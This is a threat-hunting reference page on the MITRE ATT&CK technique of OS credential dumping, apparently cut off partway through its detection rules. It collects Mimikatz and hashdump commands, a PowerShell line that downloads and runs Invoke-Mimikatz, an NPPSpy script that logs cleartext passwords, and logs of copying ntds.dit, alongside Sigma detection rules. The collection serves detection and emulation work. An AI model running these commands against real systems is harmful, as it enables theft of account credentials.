
# OS Credential Dumping

## Description

### MITRE Description

> Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM', 'root']
* Platforms: ['Windows', 'Linux', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003

## Potential Commands

```
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
hashdump
mimikatz !lsadump::sam
use mimikatz
wdigest
msv
kerberos
logonpasswords
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
#{gsecdump_exe} -a
Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
PathToAtomicsFolder\T1003\bin\gsecdump.exe -a
.\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp
ntdsutil.exe
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
Dos
C: \ Windows \ system32 \ ntdsutil.exe: ac i ntds
Examples of activities set to "ntds".
C: \ Windows \ system32 \ ntdsutil.exe: ifm
ifm: create full c: \ temp
Creating a snapshot ...
Successfully generated snapshot set {ea08df62-9743-4068-aedb-a2c32dfd057f}.
Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \ $ SNAP_201911011107_VOLUMEC $ \ loading
Loaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.
Starting Defragmentation Mode ...
     Source database: C: \ $ SNAP_201911011107_VOLUMEC $ \ Windows \ NTDS \ ntds.dit
     Target database: c: \ temp \ Active Directory \ ntds.dit

                  Defragmentation Status (% complete)

          0,102,030,405,060,708,090 100
          | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
          .................................................. .

Registry files are being copied ...
We are copied c: \ temp \ registry \ SYSTEM
We are copied c: \ temp \ registry \ SECURITY
Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.
In the c: \ temp successfully created IFM media.
ifm: q
C: \ Windows \ system32 \ ntdsutil.exe: q
Dos
C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / start
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

[*] Signal sent to start the VSS service.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / create c
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

[*] Attempting to create a shadow copy.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / list
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

SHADOW COPIES
=============

[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}
[*] Client accessible: True
[*] Count: 1
[*] Device object:? \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1
[*] Differential: True
[*] Exposed locally: False
[*] Exposed name:
[*] Exposed remotely: False
[*] Hardware assisted: False
[*] Imported: False
[*] No auto release: True
[*] Not surfaced: False
[*] No writers: True
[*] Originating machine: ICBC.abcc.org
[*] Persistent: True
[*] Plex: False
[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}
[*] Service machine: ICBC.abcc.org
[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}
[*] State: 12
[*] Transportable: False
[*] Volume name:? \\ \ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \


C: \ Users \ Administrator \ Desktop \ test> copy \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1 \ windows \ ntds \ ntds.dit C:? \
We have copied a file.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / delete
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.
```

## Commands Dataset

```
[{'command': 'hashdump\nmimikatz !lsadump::sam',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'hashdump\n'
             'run hashdump\n'
             'run smart_hashdump\n'
             'post/windows/gather/credentials/domain_hashdump',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'logonpasswords\n'
             'mimikatz !sekurlsa::logonpasswords\n'
             'mimikatz !sekurlsa::msv\n'
             'mimikatz !sekurlsa::kerberos\n'
             'mimikatz !sekurlsa::wdigest',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); "
             'Invoke-Mimikatz -DumpCreds\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{gsecdump_exe} -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{gsecdump_exe} -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'Copy-Item "$env:Temp\\NPPSPY.dll" -Destination '
             '"C:\\Windows\\System32"\n'
             '$path = Get-ItemProperty -Path '
             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
             '-Name PROVIDERORDER\n'
             '$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"\n'
             'Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value '
             '$UpdatedValue\n'
             '$rv = New-Item -Path '
             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction '
             'Ignore\n'
             '$rv = New-Item -Path '
             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
             '-ErrorAction Ignore\n'
             '$rv = New-ItemProperty -Path '
             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
             '-Name "Class" -Value 2 -ErrorAction Ignore\n'
             '$rv = New-ItemProperty -Path '
             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
             '-Name "Name" -Value NPPSpy -ErrorAction Ignore\n'
             '$rv = New-ItemProperty -Path '
             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
             '-Name "ProviderPath" -PropertyType ExpandString -Value '
             '"%SystemRoot%\\System32\\NPPSPY.dll" -ErrorAction Ignore\n'
             'echo "[!] Please, logout and log back in. Cleartext password for '
             'this account is going to be located in C:\\NPPSpy.txt"',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '.\\totallylegit.exe #{host.process.id} '
             'C:\\Users\\Public\\creds.dmp\n',
  'name': 'Custom GO credential dumper using minidumpwritedump',
  'source': 'data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml'},
 {'command': 'ntdsutil.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\SAM|HKLM\\Security\\\\Windows\\\\.+\\\\lsass.exe',
  'name': None,
  'source': 'SysmonHunter - Credential Dumping'},
 {'command': '\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll',
  'name': None,
  'source': 'SysmonHunter - Credential Dumping'},
 {'command': 'powershell/collection/ChromeDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ChromeDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/FoxDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/FoxDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ninjacopy',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ninjacopy',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/add_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/add_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/find_keepass_config',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/find_keepass_config',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/get_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/get_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/keethief',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/keethief',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/remove_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/remove_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/enum_cred_store',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/enum_cred_store',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/cache',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/cache',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync_hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync_hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/extract_tickets',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/extract_tickets',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/golden_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/golden_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/logonpasswords',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/logonpasswords',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/lsadump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/lsadump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/mimitokens',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/mimitokens',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/sam',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/sam',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/silver_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/silver_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/trust_keys',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/trust_keys',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/powerdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/powerdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/vault_credential',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/vault_credential',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/downgrade_account',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/downgrade_account',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/wdigest_downgrade',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/wdigest_downgrade',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/gpp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/gpp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/mcafee_sitelist',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/mcafee_sitelist',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/mimipenguin',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/mimipenguin',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/kerberosdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/kerberosdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/kerberos_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/kerberos_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/network/dcos/etcd_crawler',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/network/dcos/etcd_crawler',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Dos\n'
             'C: \\ Windows \\ system32 \\ ntdsutil.exe: ac i ntds\n'
             'Examples of activities set to "ntds".\n'
             'C: \\ Windows \\ system32 \\ ntdsutil.exe: ifm\n'
             'ifm: create full c: \\ temp\n'
             'Creating a snapshot ...\n'
             'Successfully generated snapshot set '
             '{ea08df62-9743-4068-aedb-a2c32dfd057f}.\n'
             'Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \\ $ '
             'SNAP_201911011107_VOLUMEC $ \\ loading\n'
             'Loaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.\n'
             'Starting Defragmentation Mode ...\n'
             '     Source database: C: \\ $ SNAP_201911011107_VOLUMEC $ \\ '
             'Windows \\ NTDS \\ ntds.dit\n'
             '     Target database: c: \\ temp \\ Active Directory \\ '
             'ntds.dit\n'
             '\n'
             '                  Defragmentation Status (% complete)\n'
             '\n'
             '          0,102,030,405,060,708,090 100\n'
             '          | ---- | ---- | ---- | ---- | ---- | ---- | ---- | '
             '---- | ---- | ---- |\n'
             '          .................................................. .\n'
             '\n'
             'Registry files are being copied ...\n'
             'We are copied c: \\ temp \\ registry \\ SYSTEM\n'
             'We are copied c: \\ temp \\ registry \\ SECURITY\n'
             'Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.\n'
             'In the c: \\ temp successfully created IFM media.\n'
             'ifm: q\n'
             'C: \\ Windows \\ system32 \\ ntdsutil.exe: q',
  'name': 'Dos',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Dos\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / start\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             '[*] Signal sent to start the VSS service.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / create c\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             '[*] Attempting to create a shadow copy.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / list\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             'SHADOW COPIES\n'
             '=============\n'
             '\n'
             '[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n'
             '[*] Client accessible: True\n'
             '[*] Count: 1\n'
             '[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ '
             'HarddiskVolumeShadowCopy1\n'
             '[*] Differential: True\n'
             '[*] Exposed locally: False\n'
             '[*] Exposed name:\n'
             '[*] Exposed remotely: False\n'
             '[*] Hardware assisted: False\n'
             '[*] Imported: False\n'
             '[*] No auto release: True\n'
             '[*] Not surfaced: False\n'
             '[*] No writers: True\n'
             '[*] Originating machine: ICBC.abcc.org\n'
             '[*] Persistent: True\n'
             '[*] Plex: False\n'
             '[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n'
             '[*] Service machine: ICBC.abcc.org\n'
             '[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n'
             '[*] State: 12\n'
             '[*] Transportable: False\n'
             '[*] Volume name:? \\\\ \\ Volume '
             '{16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n'
             '\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ '
             'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ '
             'ntds \\ ntds.dit C:? \\\n'
             'We have copied a file.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / delete\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.',
  'name': 'Dos',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/02/21',
                  'description': 'Detects Russian group activity as described '
                                 'in Global Threat Report 2019 by Crowdstrike',
                  'detection': {'condition': 'selection1 or selection2',
                                'selection1': {'CommandLine': '* /S /E /C /Q '
                                                              '/H \\\\*',
                                               'Image': '*\\xcopy.exe'},
                                'selection2': {'CommandLine': '* -snapshot "" '
                                                              'c:\\users\\\\*',
                                               'Image': '*\\adexplorer.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/'],
                  'tags': ['attack.credential_access',
                           'attack.t1081',
                           'attack.t1003'],
                  'title': 'Judgement Panda Exfil Activity'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/09/09',
                  'description': 'Detects a highly relevant Antivirus alert '
                                 'that reports a password dumper',
                  'detection': {'condition': 'selection',
                                'selection': {'Signature': ['*DumpCreds*',
                                                            '*Mimikatz*',
                                                            '*PWCrack*',
                                                            'HTool/WCE',
                                                            '*PSWtool*',
                                                            '*PWDump*',
                                                            '*SecurityTool*',
                                                            '*PShlSpy*']}},
                  'falsepositives': ['Unlikely'],
                  'fields': ['FileName', 'User'],
                  'id': '78cc2dd2-7d20-4d32-93ff-057084c38b93',
                  'level': 'critical',
                  'logsource': {'product': 'antivirus'},
                  'modified': '2019/10/04',
                  'references': ['https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/'],
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Antivirus Password Dumper Detection'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/07/24',
                  'description': 'Detects possible SafetyKatz Behaviour',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 11,
                                              'TargetFilename': '*\\Temp\\debug.bin'}},
                  'falsepositives': ['Unknown'],
                  'id': 'e074832a-eada-4fd7-94a1-10642b130e16',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://github.com/GhostPack/SafetyKatz'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Detection of SafetyKatz'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'Detects process LSASS memory dump using '
                                 'procdump or taskmgr based on the CallTrace '
                                 'pointing to dbghelp.dll or dbgcore.dll for '
                                 'win10',
                  'detection': {'condition': 'selection',
                                'selection': {'CallTrace': ['*dbghelp.dll*',
                                                            '*dbgcore.dll*'],
                                              'EventID': 10,
                                              'GrantedAccess': '0x1fffff',
                                              'TargetImage': 'C:\\windows\\system32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': '5ef9853e-4d0e-4a70-846f-a9ca37d876da',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html'],
                  'status': 'experimental',
                  'tags': ['attack.t1003',
                           'attack.s0002',
                           'attack.credential_access'],
                  'title': 'LSASS Memory Dump'}},
